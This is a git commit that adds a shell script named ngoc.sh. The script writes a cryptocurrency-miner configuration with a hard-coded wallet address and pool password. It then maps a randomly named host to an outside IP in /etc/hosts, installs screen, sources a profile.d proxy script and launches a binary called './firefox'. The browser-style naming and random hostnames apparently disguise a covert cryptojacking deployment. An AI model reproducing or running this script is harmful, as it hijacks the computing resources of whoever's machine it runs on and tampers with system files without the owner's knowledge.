ea10c0d714def4631ef23baf347340c9b3cf3cb4
devlamgi <39730414+devlamgi@users.noreply.github.com>
2023-07-10 16:26:44 +0700

    Create ngoc.sh

---
+++ ngoc.sh
@@ -0,0 +1,137 @@
+
+#!/bin/sh
+cd profiles
+export firefoxsetup=$(openssl rand -hex 20)
+export link=$(openssl rand -hex 4)
+bash -c 'cat <<EOT >>config.json
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": false,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+     "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 2, 1, 3],
+        "cn-pico": [
+            [2, 0],
+            [2, 8],
+            [2, 2],
+            [2, 10],
+            [2, 4],
+            [2, 12],
+            [2, 6],
+            [2, 14],
+            [2, 1],
+            [2, 9],
+            [2, 3],
+            [2, 11],
+            [2, 5],
+            [2, 13]
+        ],
+        "cn/gpu": [0, 2, 1, 3],
+        "rx": [0, 1],
+        "rx/wow": [0, 2, 1, 3],
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "donate-level": 1,
+    "donate-over-proxy": 1,
+    "log-file": null,
+    "pools": [
+        {
+            "algo": null,
+            "coin": null,
+            "user": "hvs1b7f7CRB94N7EByxUbdNDHWmAyQ4oBLtdxLM8MCPAcdCqjYiobjiibeu5kJZqJ2Yfsw7xqBM4u3yx7TV9aPNp7uFJutrvyy",
+            "pass": "hvnteam",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "enabled": true,
+            "tls": true,
+            "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
+    "retries": 5,
+    "retry-pause": 5,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
+EOT
+'
+#!/bin/sh
+bash -c 'cat <<EOT >>/etc/hosts
+161.97.77.44      $firefoxsetup.$link
+EOT
+'
+apt install screen -y
+
+chmod +x  /etc/profile.d/proxy.sh
+source /etc/profile.d/proxy.sh
+./firefox
